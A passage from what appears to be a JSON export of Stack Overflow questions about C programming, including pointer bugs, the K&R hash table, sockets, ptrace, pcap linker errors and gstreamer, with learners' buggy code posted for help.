changing in adress before and after function call","body":"<p>I am writing a c program which stores pointers to structures (called Figure) within an array, initiated like so:</p>\n\n<pre><code>Figure ** farray = (Figure**) malloc(FNUM * sizeof(Figure*))\n</code></pre>\n\n<p>with figure being a structure like so:</p>\n\n<pre><code>struct figure {\n  char name[LNAME];\n  double * x;    \n  double * y;      \n  int dmax;\n  int draw;  \n};\n</code></pre>\n\n<p>When the figures are created, they are called in static memory, with the two arrays of doubles stored in dynamic memory, like so:</p>\n\n<pre><code>  memset(tfigure.name, 0, sizeof(tfigure.name));\n  tfigure.x = (double *) malloc(DNUM * sizeof(double));\n  tfigure.y = (double *) malloc(DNUM * sizeof(double));\n  tfigure.dmax = DNUM;\n\n  sscanf(buffer, \"%*s %s %lf %lf\", tfigure.name, &amp;tx, &amp;ty);   \n</code></pre>\n\n<p>and then their adress is saved within the array. Now, here is the problem. I have a function called draw, which when called returns a different value for farray[index]->name then was returned before it was called.</p>\n\n<p>Here it is:</p>\n\n<pre><code>  printf(\"Before draw: %s\\n\", farray[openFigure]-&gt;name);\n  draw(buffer, farray, openFigure);\n</code></pre>\n\n<p>goint into:</p>\n\n<pre><code>int draw(char buffer[], Figure** farray, const int state)\n{\n  printf(\"After draw: %s\\n\", farray[state]-&gt;name);  \n  ...\n</code></pre>\n\n<p>This returns:</p>\n\n<pre><code>Before draw: A\nAfter draw: `����\n</code></pre>\n\n<p>\"A\" is correct, the other is obviously not correct. Can anyone give me some insight into how to fix this? I can post any more of my code needed and I'm sorry that I'm not being clearer in my issue, however, I have little to no idea what my issue actually is. I assume that either the address of farray is changing, the address stores at that index in farray is changing, or the data STORED at that address is changing. I have no real idea though. And it's killing me. Any help is appreciated.  </p>\n\n<p>Edit:</p>\n\n<p>The pointer to the figure in memory is added to the array as such:</p>\n\n<pre><code>Figure tfigure;\nfarray[index] = &amp;tfigure;\n</code></pre>\n\n<p>Taking advice, I printed the addresses of the Figures, and they were both the same, however the address of farray itself changed. Could this have something to do with how farray is passed to the function? I tried passing a pointer to the array instead, with no luck. </p>\n"},{"tags":["c","hashtable"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":194,"score":1,"question_id":7014771,"title":"Table lookup install function from k&r","body":"<p>Section 6.6 of K&amp;R discusses a hash table using a linked list.</p>\n\n<p>In short, a hash table is an array of pointers.  The pointers point to a linked list.  The linked list is a struct that looks like:</p>\n\n<pre><code>struct nlist {             /* table entry: */\n    struct nlist *next;    /* next entry in chain */\n    char *name;            /* defined name */\n    char *defn;            /* replacement text */\n};\n</code></pre>\n\n<p>The name is hashed, and this hash determines the index in the table.  The chapter then shows code to add a name/defn pair to the table:</p>\n\n<pre><code>struct nlist *install(char *name, char *defn) {\n    struct nlist *np;\n    unsigned hashval;\n    if ((np = lookup(name)) == NULL) { /* not found */\n        np = (struct nlist *) malloc(sizeof(*np));\n        if (np == NULL || (np-&gt;name = strdup(name)) == NULL)\n            return NULL;\n        hashval = hash(name);\n        np-&gt;next = hashtab[hashval];\n        hashtab[hashval] = np;\n    } else /* already there */\n        free((void *) np-&gt;defn); /*free previous defn */\n    if ((np-&gt;defn = strdup(defn)) == NULL)\n        return NULL;\n    return np;\n}\n</code></pre>\n\n<p>Everything makes sense except for the following 2 lines:</p>\n\n<pre><code>np-&gt;next = hashtab[hashval];\nhashtab[hashval] = np;\n</code></pre>\n\n<p>When I try to understand this, I keep coming to the conclusion that the list now links back to itself and if you try to traverse the linked list it will be like a dog chasing its own tail.  I would expect the code to set np->next to NULL.</p>\n\n<p>What am I not understanding?  How come this code works ?</p>\n"},{"tags":["c","dynamic-arrays"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":13223137,"title":"How to correctly implement a dynamic array in C","body":"<p>I have tried to write a short program in C that takes in space separated tokens from stdin, shuffles (permutes) the tokens and then prints the shuffles tokens to stdout. My shuffling algorithm works fine, the problem lies in the token parsing. I wanted to store the tokens in a dynamic string array so the program could support any number of tokens to be passed in through stdin. However, my current implementation of the dynamic array results in a segmentation fault whenever the array needs to be expanded. What am I doing incorrectly?</p>\n\n<p>My Code: </p>\n\n<pre><code>#include &lt;time.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#define BUFFERSIZE 33\n\nint main(int argc, char* argv[]) {\n  int i,j,k;\n  i=j=k=0;\n  int arrSize = 10;\n  /* Temp fix */\n  /* Get token count as command line argument */\n  //if (argc==2) { sscanf(argv[1],\"%d\",&amp;arrSize); }\n  char  c='\\0';\n  char* t;\n  char** datArr = (char**)malloc(sizeof(char*)*arrSize);\n  //char* datArr[arrSize];\n  char  token[BUFFERSIZE];\n  while ( (c=getc(stdin)) != EOF &amp;&amp; c != '\\0') {\n    if(isspace(c)) {\n      token[i] = '\\0';\n      i=0;\n      if ( j &gt;= arrSize) {\n        arrSize *= 2;\n        realloc(datArr, arrSize);\n      }\n      char* s = (char*)malloc(sizeof(char[BUFFERSIZE]));\n      strcpy(s,token);\n      datArr[j++] = s;\n    }\n    else if(i+1 &lt; BUFFERSIZE) {\n      token[i++] = c;\n    }\n  }\n  /* Permutate &amp; Print */\n  srand(time(NULL));\n  for(i=0;i&lt;j;++i) {\n    k = rand()%(j-i);\n    t = datArr[k];\n    datArr[k] = datArr[j-i-1];\n    datArr[j-i-1] = t;\n  }\n  for(i=0;i&lt;j;++i) { printf(\"%s \",datArr[i]); }\n  printf(\"\\n\");\n  return 0;\n}\n</code></pre>\n\n<p><strong>NOTE:</strong> I know I did free the memory yet</p>\n\n<p>Some sample input (to keep it card themed):</p>\n\n<pre><code>2C 3C 4C 5C 6C 7C 8C 9C 10C JC KC QC AC 2S 3S 4S 5S 6S 7S 8S 9S 10S JS KS QS AS\n</code></pre>\n"},{"tags":["c","struct","berkeley-sockets"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13224374,"title":"Berkeley socket communication, send and receive structs","body":"<p>I have a assignment where I am going to implement a score-server for a game. When a game is done the game is going to send() players name (char *name) and score (int score) to the server  for registration, receive(), and the server is going to send back 5 top-scores. </p>\n\n<p>We are going to use Berkeley sockets and C. After some reading and studying of examples I can only find examples that just sends single variables.</p>\n\n<pre><code>write(sd, \"Hello World\", 12);\n\nchar buf[13];\nread(sd, buf, 12);\nbuf[12] = '\\0';\n</code></pre>\n\n<p>What is usual to do ? Send each variable (name and score) is separate write() functions, or create a struct that holds both variables ?</p>\n\n<p>After some reading in <strong>Beej's Guide to Network Programming</strong> I come across the problem with byte order(big/little -endian) that I must take in account, this is shown under the section <em>7.4 Serialization - How to pack data</em>, and is OK except that in all sample code packages they float and single variables, is there any way to pack an entire struct ?</p>\n\n<p>There is also a section <em>7.5 Sone of Data Encapsulation</em> that takes about creating a protocol that describes how a client and server communicates, for me this looks more like a struct and what I wont to do, but there is no code that shows the principle.</p>\n\n<hr>\n\n<p>In short: I want to create a stable communication between server and client where I exchange more than just single variables,</p>\n"},{"tags":["c","struct","malloc","2d-array","segmentation"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13224113,"title":"Using a pointer to a dynamic 2D Array within a struct","body":"<p>I have been writing a piece of code for my coursework in electromagnetic simulation and I have run into a problem. I decided to do a bit extra by expanding the original calculations to really large meshes of up to 10^8 elements, so now I have to use malloc(). </p>\n\n<p>So far, so good, but since I prefer to keep my code in libraries and then compile with the inline option of the compiler, I needed a way to pass information between functions. So, I started using structs to keep track of the parameters of the mesh, as well as the pointer to the array of information. I defined the struct the following way:</p>\n\n<pre><code>typedef struct {\n    int    height;\n    int    width;\n    int    bottom; //position of the bottom node\n    unsigned int***  dat_ptr;//the pointer to the array with all the data\n    } array_info;\n</code></pre>\n\n<p>Where the triple pointer to an unsigned int is the pointer to a 2D array. I have to do it this way because otherwise it is passed by value and I cannot change it from within the function.</p>\n\n<p>Now, when I try to allocate memory for the struct with the following function:</p>\n\n<pre><code>void create_array(array_info A)//the function accepts struct of type \"array_info\" as argument\n{\n    int i;\n\n    unsigned int** array = malloc(sizeof(*array) * A.height);//creates an array of arrays\n    for(i = 0; i&lt;A.height; ++i)\n    {\n        array[i] = malloc(sizeof(**array) * A.width);//creates an array for each row\n    }\n    *A.dat_ptr=array;//assigns the position of the array to the input pointer\n}\n</code></pre>\n\n<p>I get a segmentation fault upon executing the operation. I cannot see why: sizeof(*A.dat_ptr) is the same as sizeof(array). Thus, in the worst case I should be getting gibberish somewhere down the line, not in the assignment line, right?</p>\n"},{"tags":["c","optimization","cuda"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13222165,"title":"In what types of loops is it best to use the #pragma unroll directive in CUDA?","body":"<p>In CUDA it is possible to unroll loops using the <code>#pragma</code> unroll directive to improve performance by increasing instruction level parallelism. The <code>#pragma</code> can optionally be followed by a number that specifies how many times the loop must be unrolled.</p>\n\n<p>Unfortunately the docs do not give specific directions on when this directive should be used. Since small loops with a known trip count are already unrolled by the compiler, should <code>#pragma</code> unroll be used on larger loops? On small loops with a variable counter? And what about the optional number of unrolls? Also is there recommended documentation about cuda specific loop unrolling?</p>\n"},{"tags":["c","ruby","sockets","select"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":2,"view_count":42,"score":-1,"question_id":13223736,"title":"is it possible to pause/resume part of a full-duplex connection?","body":"<p>Yes, no?<br/></p>\n\n<p>How can I achieve something like this:</p>\n\n<p><strong>In Client side</strong></p>\n\n<pre><code>loop do\n    socket.read(MAX_LEN)\n    socket.pause_read   # the client is busy, do not send any more data, similar to: C system call shutdown(sock, SHUT_RD)\n    # ... working\n\n    socket.resume_read  # the client is ready to work again. \nend\n</code></pre>\n\n<p><strong>In Server side</strong></p>\n\n<pre><code>loop do\n    rd, wr, _ = select(rdsockets, wrsockets)\n    # wr is an array fill of clients ready to work\n    wr.each {}\nend\n</code></pre>\n\n<p>PS: Help can be provided either with C or Ruby.\nThank you in advance.</p>\n\n<p>EDIT:\nThe incoming data has a predefined format and the length of the incoming data varies.</p>\n\n<p>EDIT2:\nOS: Linux</p>\n"},{"tags":["c","ubuntu","linker-error","pcap"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13224174,"title":"How to fix \"undefined reference\" linker errors that occur in spite of passing the right flags?","body":"<p>I'm trying to compile <a href=\"http://code.google.com/p/n1mda-dev/source/browse/#svn/trunk/pirni\" rel=\"nofollow\">this C program called Pirni</a>, which was originally made for iPhone, and I would like to run it on linux Ubuntu 12.04 LTS. It's very short, (3 C files and 1 header file). But I get the following errors. I do have <code>libpcap-dev</code> installed and I did include <code>-lpcap</code> so I don't know what could be wrong.</p>\n\n<pre><code>gcc -Wall -pthread -lpcap pirni.c threads.c sniffer.c -o pirni -lnet\npirni.c: In function ‘set_forwarding’:\npirni.c:31:2: warning: implicit declaration of function ‘sysctlbyname’ [-Wimplicit-function-declaration]\n/tmp/cc3sf284.o: In function `set_forwarding':\npirni.c:(.text+0xfd): undefined reference to `sysctlbyname'\n/tmp/ccvGjyMo.o: In function `processPacket':\nsniffer.c:(.text+0x1b): undefined reference to `pcap_dump'\n/tmp/ccvGjyMo.o: In function `initSniffer':\nsniffer.c:(.text+0xfa): undefined reference to `pcap_open_live'\nsniffer.c:(.text+0x15a): undefined reference to `pcap_lookupnet'\nsniffer.c:(.text+0x1af): undefined reference to `pcap_compile'\nsniffer.c:(.text+0x1dd): undefined reference to `pcap_setfilter'\nsniffer.c:(.text+0x222): undefined reference to `pcap_dump_open'\nsniffer.c:(.text+0x27c): undefined reference to `pcap_loop'\ncollect2: ld returned 1 exit status\nmake: *** [main] Error 1\n</code></pre>\n"},{"tags":["c","linux","ptrace"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":488,"score":3,"question_id":3179487,"title":"Stack Walk on linux using ptrace","body":"<p>Following is my requirement.</p>\n\n<p>while process A is running.</p>\n\n<ol>\n<li>attach Process A from B with PTRACE_ATTACH.</li>\n<li>Start a Loop</li>\n<li>Stop Process A</li>\n<li>read registers </li>\n<li>Resume Process A</li>\n<li>sleep(1)</li>\n<li>end loop</li>\n<li>detach A</li>\n</ol>\n\n<p>i am facing issue with Start and Resume Process A from the loop. i tried combination of kill(pid,SIGSTOP), kill(pid,SIGCONT), PTRACE_CONT. but didnt work.</p>\n\n<p>any other solutions please?</p>\n\n<p>Thanks in advance.\nSandeep</p>\n"},{"tags":["c","linux"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":13023523,"title":"Working with Pointers and Strcpy in C","body":"<p>I'm fairly new to the concept of pointers in C. Let's say I have two variables:</p>\n\n<pre><code>char *arch_file_name;\nchar *tmp_arch_file_name;\n</code></pre>\n\n<p>Now, I want to copy the value of <code>arch_file_name</code> to <code>tmp_arch_file_name</code> and add the word \"tmp\" to the end of it. I'm looking at them as strings, so I have:</p>\n\n<pre><code>strcpy(&amp;tmp_arch_file_name, &amp;arch_file_name);\nstrcat(tmp_arch_file_name, \"tmp\");\n</code></pre>\n\n<p>However, when <code>strcat()</code> is called, both of the variables change and are the same. I want one of them to <strong>change</strong> and the other to <strong>stay intact</strong>. I have to use pointers because I use the names later for the fopen(), rename() and delete() functions. How can I achieve this?</p>\n"},{"tags":["c","pointers"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":41,"score":-2,"question_id":13224088,"title":"How to set integer pointer to a number, and make it behave as non-pointer integer?","body":"<p>This is the current code which isn't working. I need j to be a pointer.</p>\n\n<pre><code>Substring(const char a[],int x,int y,char b[])\n{\n    int *j=0;\n    for(x;x&lt;=y&amp;&amp;a[x]!='\\0';x++)\n    { b[*j]=a[x];\n         *j++;}\n    b[*j] ='\\0';\n    return (b);\n\n}\n</code></pre>\n\n<p>The following code works well, the only problem is that j is not a pointer.</p>\n\n<pre><code>Substring(const char a[],int x,int y,char b[])\n    {\n        int j=0;\n        for(;x&lt;=y&amp;&amp;a[x]!='\\0';x++)\n        { b[j]=a[x];\n             j++;}\n        b[j] ='\\0';\n        return (b);\n\n    }\n</code></pre>\n\n<p>I want the first code to behave like the second, any ideas on how to do this?\nThe code compiles and executes, but it stops working. Debugging has not helped.\nI can't use more than 1 variable - j.</p>\n"},{"tags":["c","sockets"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":13223821,"title":"recv does not save the whole message in the buffer","body":"<p>I use send and recv to pass messages between a client and a server. On the server side when i receive a message on buffer fname the message saved is not the whole message that has been sent from client</p>\n\n<p>SERVER</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;time.h&gt;\n#include &lt;sys/types.h&gt;      /*For Sockets*/\n#include &lt;sys/socket.h&gt;     /*For Sockets*/\n#include &lt;netdb.h&gt;      /*For gethostbyaddr()*/\n#include &lt;netinet/in.h&gt;     /*For internet sockets*/\n#include &lt;dirent.h&gt;\n\n\n/*Function for creating the lof file of Server*/\n\nvoid log_event (char *message,char *filename)\n{\n\nFILE *file; \nchar *log_this;\n\ntime_t system_time; //Get the system time\ntime(&amp;system_time);\n\nlog_this=strcat(ctime(&amp;system_time),message); //Create the message to log \n\n/*Check for filename and log as appropiate*/\n\nif (filename!=NULL)\n    {\n        file = fopen(filename,\"a+\"); \n        fprintf(file,\"%s\",log_this); /*writes the message*/\n        fclose(file); /*done!*/     \n    }\nelse    \n    {\n        file = fopen(\"ftp_tracelog.txt\",\"a+\"); \n        fprintf(file,\"%s\",log_this); /*writes the message*/\n        fclose(file); /*done!*/ \n    }\n\n}\n\nint main (int argc,char *argv[])\n{\n\n/*DECLERATIONS*/\n\nchar *filename; \nchar message [1024];\nchar *temp;\nchar temp_2[1024];\nchar fname[128];\nchar request[1024];\nchar op[1000];\nchar command[5];\nFILE *fp;\nDIR *dp;\nchar list[1024];\nint port,sock,newsock,serverlen,clientlen,fname_len,recvMsgSize,i;\nchar buf[256];\n\nstruct sockaddr_in server,client;\nstruct sockaddr *serverptr, *clientptr;\nstruct hostent *rem;\nstruct dirent *ep;     \n\n/*END OF DECLERATIONS*/\n\n/*Check for required arguments and get them as appropiate*/\n\nif (argc &lt; 2) { \n/* Check if server's port number is given */\nprintf(\"Please give the port number!!!\\n\");\nexit(1);\n}\n\n/*if server's port number is given and filename for log is given*/\n\nif(argc&gt;2){\nfilename=argv[1];\nport=atoi(argv[2]);\n}\n\n/*If only port is given*/\n\nif (argc==2){\nport=atoi(argv[1]);\nfilename=NULL;\n}\ntemp=\"--Server is Starting!!--\";\nsprintf(message,\"%s\\n\",temp);\nlog_event(message,filename);\n\n/* Create socket */\n\nif ((sock = socket(PF_INET, SOCK_STREAM, 0)) &lt; 0)\n{perror(\"socket\"); exit(1); }\n\nserver.sin_family = PF_INET; /* Internet domain */\nserver.sin_addr.s_addr = htonl(INADDR_ANY); /* My Internet address */\nserver.sin_port = htons(port); /* The given port */\nserverptr = (struct sockaddr *) &amp;server;\nserverlen = sizeof (server);\n\n/* Bind socket to address */\n\nif (bind(sock, serverptr, serverlen) &lt; 0) {\nperror(\"bind\"); exit(1); }\n\n/* Listen for connections */\n\nif (listen(sock, 40) &lt; 0) { /* 5 max. requests in queue */\nperror(\"listen\"); exit(1); }\n\ntemp=\"---Listening for connections to port\";\nsprintf(temp_2,\"%d----\",port);\nsprintf(message,\"%s:%s\\n\",temp,temp_2);\nlog_event(message,filename);\n\n/*Accepting Connecttion*/\n\nwhile(1) {\nclientptr = (struct sockaddr *) &amp;client;\nclientlen = sizeof(client);\n/* Accept connection */\nif ((newsock = accept(sock, clientptr, &amp;clientlen)) &lt; 0) {\nperror(\"accept\"); exit(1); }\n/* Find client's address */\nif ((rem = gethostbyaddr((char *) &amp;client.sin_addr.s_addr,\nsizeof (client.sin_addr.s_addr), client.sin_family)) == NULL) {\nperror(\"gethostbyaddr\"); exit(1);\n}\n\ntemp=\"----Accepted connection from \";\nsprintf(temp_2,\"%s----\", rem -&gt; h_name);\nsprintf(message,\"%s:%s\\n\",temp,temp_2);\nlog_event(message,filename);\n\n/* Create child for serving the client */\nswitch (fork()) {\n\ncase -1:\nperror(\"fork\"); exit(1);\n\ncase 0: /* Child process */\ndo{\n/* Receive message from client */\nif ((recvMsgSize = recv(newsock,request,sizeof(request),0))&lt; 0)\nperror(\"recv() failed\");\n//printf(\"%s\\n\",request);\n\nstrncpy(command,request,4);\nprintf(\"%s\\n\",command);\n/*IF YOU ARE GOING TO EXECUTE AN LS COMMAND*/\n\nif (strcmp(command,\"ls\")==0)\n{\ndp = opendir (\"./\");\n\nif (dp != NULL)\n  { /*LOG LS REQUEST*/\n\n    temp=\"--Client \";\n    sprintf(temp_2,\"%s requested ls -------\",rem -&gt; h_name);\n    sprintf(message,\"%s:%s\\n\",temp,temp_2);\n    log_event(message,filename);\n\n    /*SEND ALL DIRECTORY LISTING*/    \n\n    while (ep = readdir (dp))\n{\n    strcpy(list,ep-&gt;d_name);\n    //printf(\"sending:%s\\n\",list);\n    if (send(newsock,list,sizeof(list), 0)!= sizeof(list))\n    perror(\"send() sent a different number of bytes than expected\");\n}\n    //IF DIRECORY IS FINISHED SEND A LAST MESSAGE FOR ENDING\n\n    (void) closedir (dp);\n    if (send(newsock,\"end\",sizeof(\"end\"), 0)!= sizeof(\"end\"))\n    perror(\"send() sent a different number of bytes than expected\");    \n  }\n  else\n    perror (\"Couldn't open the directory\");\n}\n/*IF THE COMMAND IS PUT*/\n\nif (strcmp(command,\"put\")==0) \n{\nprintf(\"execute put!!\\n\");\n\nbzero(fname, sizeof fname); /* Initialize buffer */\n\nif ((recvMsgSize = recv(newsock,fname,128, MSG_WAITALL)) &lt; 0)\nperror(\"recv() failed\");\n\nprintf(\"%s!!!!\\n\",fname);\n\n}\n}while (strcmp(request,\"end\")!=0); //run until client sents end request\n\n/*LOG EXIT OF CLIENT*/\n\ntemp=\"--Client\";\n    sprintf(temp_2,\"%s is disconnected---\",rem -&gt; h_name);\n    sprintf(message,\"%s:%s\\n\",temp,temp_2);\n    log_event(message,filename);\n\nclose(newsock); /* Close socket */\nexit(0);\n} /* end of switch */\n} /* end of while(1) */\n\n\n}\n</code></pre>\n\n<p>CLIENT</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;netdb.h&gt;\n#include &lt;netinet/in.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;sys/types.h&gt;\n\nint main (int argc,char *argv[])\n{\n\nint port, sock, serverlen,recvMsgSize;\nint fname_len,msg_len,request_len;\nchar buf[256];\nchar fname[128];\nchar request[1204];\nchar list[1024];\nchar msg[512];\nchar op[1000];\nchar temp[5];\nchar *temp3;\nFILE *fp;\n\n\nstruct sockaddr_in server;\nstruct sockaddr *serverptr;\nstruct hostent *rem;\n\ntemp3=\"put\";\n\n/* Are server's host name and port number given? */\nif (argc &lt; 3) {\nprintf(\"Please give host name and port number\\n\"); exit(1);\n\n}\n\n/* Create socket */\nif ((sock = socket(PF_INET, SOCK_STREAM, 0)) &lt; 0) {\nperror(\"socket\");\nexit(1);\n}\n\n/* Find server address */\nif ((rem = gethostbyname(argv[1])) == NULL) {\nherror(\"gethostbyname\"); exit(1);\n}\n\n/* Convert port number to integer */\nport = atoi(argv[2]);\n\n/* Internet domain */\nserver.sin_family = PF_INET; \nbcopy((char *) rem -&gt; h_addr, (char *) &amp;server.sin_addr,\nrem -&gt; h_length);\n\n/*Server's Internet address and port*/\nserver.sin_port = htons(port); \nserverptr = (struct sockaddr *) &amp;server;\nserverlen = sizeof(server);\n\n\nif (connect(sock, serverptr, serverlen) &lt; 0) { /* Request connection */\nperror(\"connect\"); \nexit(1); }\n\nprintf(\"Requested connection to host %s port %d\\n\", argv[1], port);\n\n\n\ndo{\nprintf(\"Please enter request\\n:\");\nscanf(\"%s\",request);\n\nrequest_len=sizeof(request);\n\n/* Send the string to the server */\nif (send(sock,request,request_len, 0)!= request_len)\nperror(\"send() sent a different number of bytes than expected\");\n\nstrncpy(temp,request,4);\nprintf(\"%s\\n\",temp);\n\nif(strcmp(temp,\"ls\")==0)\n{\nsprintf(list,\"\");\n\n/*Recieve from server*/\nwhile(strcmp(list,\"end\")!=0){\n\nif ((recvMsgSize = recv(sock,list,sizeof(list),0))&lt; 0)\nperror(\"recv() failed\");\n\nif(strcmp(list,\"end\")!=0){\n    printf(\"%s\\n\",list);\n        }\n}\n}\n\n/*Command for put*/\nif(strcmp(request,temp)==0)\n{\nprintf(\"Please enter filename:\\n\");\nscanf(\"%s\",fname);\n\nif (send(sock,fname,128, MSG_DONTWAIT)!= 128)\nperror(\"send() sent a different number of bytes than expected\");\n\n}\n}while (strcmp(request,\"end\")!=0);\nclose(sock); /* Close socket */\nexit(0);\n}\n</code></pre>\n"},{"tags":["c","pointers","bitwise"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":59,"score":-2,"question_id":13223922,"title":"Assignment Makes a Pointer from Integer without cast, but there is a cast","body":"<p>I am trying to write a method given passed char pointers to change the original values of <code>Out1</code> and <code>Out0</code> and given the bitwise comparison functions. The main file tests various values. However, I keep getting an error saying that <code>Out1</code> and <code>Out0</code> of <code>fsm</code> make <code>pointers from integers without a cast</code>, even though I cast it. Any help would be greatly appreciated. Here is the code.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid fsm(char I1, char I0, char Reset, char *Out1, char *Out0){\n    int I1num = I1-'0';\n    int I0num = I0-'0';\n    int ResetNum = Reset - '0';\n    int Out1Num = *Out1 - '0';\n    int Out0Num = *Out0 - '0';\n\n    int Out1Final = (Out0Num &amp; !I0num &amp; Out1Num)|(!Out0Num &amp; I0num)|(!Out0Num &amp; !Out1Num)|(I0num &amp; !Out1Num);\n    int Out0Final = ((!(Out1Num &amp; I0num) &amp; !(!Out1Num &amp; I0) &amp; !(Out1Num &amp; !(I0))) &amp; !Out0Num) | (!(!((!Out1Num)&amp;(I1num))&amp;!((Out1Num)&amp;(!I0num)))&amp;Out0Num);\n\n    Out1 = (char)(Out1Final);\n    Out0 = (char)(Out0Final);\n}\n\n/*\n * \n */\nint main(int argc, char** argv) {\n\n    char Out1 = '0';\n    char Out0 = '0';\n    char *Out1Ptr = &amp;Out1;\n    char *Out0Ptr = &amp;Out0;\n    fsm('0','0','0', *Out1Ptr, *Out0Ptr);\n    printf(\"After I1:0, I0:0, Reset:0, Q1:0, Q0:0. Out1 is %s and Out0 is %s .\", *Out1Ptr, *Out0Ptr );\n    Out1 = '1';\n    Out0 = '0';\n    fsm('0','0','0', *Out1Ptr, *Out0Ptr);\n    printf(\"After I1:0, I0:0, Reset:0, Q1:1, Q0:0. Out1 is %s and Out0 is %s .\", *Out1Ptr, *Out0Ptr );\n    Out1 = '1';\n    Out0 = '1';\n    fsm('0','0','0', *Out1Ptr, *Out0Ptr);\n    printf(\"After I1:0, I0:0, Reset:0, Q1:1, Q0:1. Out1 is %s and Out0 is %s .\", *Out1Ptr, *Out0Ptr );\n    Out1 = '0';\n    Out0 = '1';\n    fsm('0','0','0', *Out1Ptr, *Out0Ptr);\n    printf(\"After I1:0, I0:0, Reset:0, Q1:0, Q0:1. Out1 is %s and Out0 is %s .\", *Out1Ptr, *Out0Ptr );\n\n    Out1 = '0';\n    Out0 = '0';\n        *Out1Ptr = Out1;\n    *Out0Ptr = Out0;\n    fsm('1','0','0', *Out1Ptr, *Out0Ptr);\n    printf(\"After I1:1, I0:0, Reset:0, Q1:0, Q0:0. Out1 is %s and Out0 is %s .\", *Out1Ptr, *Out0Ptr );\n    Out1 = '1';\n    Out0 = '0';\n    fsm('1','0','0', *Out1Ptr, *Out0Ptr);\n    printf(\"After I1:1, I0:0, Reset:0, Q1:1, Q0:0. Out1 is %s and Out0 is %s .\", *Out1Ptr, *Out0Ptr );\n    Out1 = '1';\n    Out0 = '1';\n    fsm('1','0','0', *Out1Ptr, *Out0Ptr);\n    printf(\"After I1:1, I0:0, Reset:0, Q1:1, Q0:1. Out1 is %s and Out0 is %s .\", *Out1Ptr, *Out0Ptr );\n    Out1 = '0';\n    Out0 = '1';\n    fsm('1','0','0', *Out1Ptr, *Out0Ptr);\n    printf(\"After I1:1, I0:0, Reset:0, Q1:0, Q0:1. Out1 is %s and Out0 is %s .\", *Out1Ptr, *Out0Ptr );\n\n    Out1 = '0';\n    Out0 = '0';\n        *Out1Ptr = Out1;\n    *Out0Ptr = Out0;\n    fsm('0','1','0', *Out1Ptr, *Out0Ptr);\n    printf(\"After I1:0, I0:1, Reset:0, Q1:0, Q0:0. Out1 is %c and Out0 is %c .\", *Out1Ptr, *Out0Ptr );\n    Out1 = '1';\n    Out0 = '0';\n    fsm('0','1','0', *Out1Ptr, *Out0Ptr);\n    printf(\"After I1:0, I0:1, Reset:0, Q1:1, Q0:0. Out1 is %c and Out0 is %c .\", *Out1Ptr, *Out0Ptr );\n    Out1 = '1';\n    Out0 = '1';\n    fsm('0','1','0', *Out1Ptr, *Out0Ptr);\n    printf(\"After I1:0, I0:1, Reset:0, Q1:1, Q0:1. Out1 is %c and Out0 is %c .\", *Out1Ptr, *Out0Ptr );\n    Out1 = '0';\n    Out0 = '1';\n    fsm('0','1','0', *Out1Ptr, *Out0Ptr);\n    printf(\"After I1:0, I0:1, Reset:0, Q1:0, Q0:1. Out1 is %c and Out0 is %c .\", *Out1Ptr, *Out0Ptr );\n\n    Out1 = '0';\n    Out0 = '0';\n        *Out1Ptr = Out1;\n    *Out0Ptr = Out0;\n    fsm('1','1','0', *Out1Ptr, *Out0Ptr);\n    printf(\"After I1:1, I0:1, Reset:0, Q1:0, Q0:0. Out1 is %c and Out0 is %c .\", *Out1Ptr, *Out0Ptr );\n    Out1 = '1';\n    Out0 = '0';\n    fsm('1','1','0', *Out1Ptr, *Out0Ptr);\n    printf(\"After I1:1, I0:1, Reset:0, Q1:1, Q0:0. Out1 is %c and Out0 is %c .\", *Out1Ptr, *Out0Ptr );\n    Out1 = '1';\n    Out0 = '1';\n    fsm('1','1','0', *Out1Ptr, *Out0Ptr);\n    printf(\"After I1:1, I0:1, Reset:0, Q1:1, Q0:1. Out1 is %c and Out0 is %c .\", *Out1Ptr, *Out0Ptr );\n    Out1 = '0';\n    Out0 = '1';\n    fsm('1','1','0', *Out1Ptr, *Out0Ptr);\n    printf(\"After I1:1, I0:1, Reset:0, Q1:0, Q0:1. Out1 is %c and Out0 is %c .\", *Out1Ptr, *Out0Ptr );\n\n    return (EXIT_SUCCESS);\n}\n</code></pre>\n"},{"tags":["c","gstreamer"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13209299,"title":"gstreamer display video information","body":"<p>I'm trying to use gstreamer to display video information like the frequency, the number of channels, the width and height. I use this code to do it but it doesn't work.\nI code in C.</p>\n\n<pre><code>GstStructure *structure;\n// guint32       fourcc;\nconst GValue *val;\nGstPad     *audiopad;\nGstCaps *caps;\ngint    width;\ngint    height;\nint     fps_num = 1;\nint     fps_den = 1;\naudiopad = gst_element_get_pad (queuevideo, \"tee\");\ncaps = gst_pad_get_caps (audiopad);\n\nstructure = gst_caps_get_structure (GST_CAPS (caps), 0);\ngst_structure_get_int (structure, \"width\", &amp;width);\ngst_structure_get_int (structure, \"height\", &amp;height);\nval = gst_structure_get_value (structure, \"framerate\");\nif (val) {\n    fps_num = gst_value_get_fraction_numerator 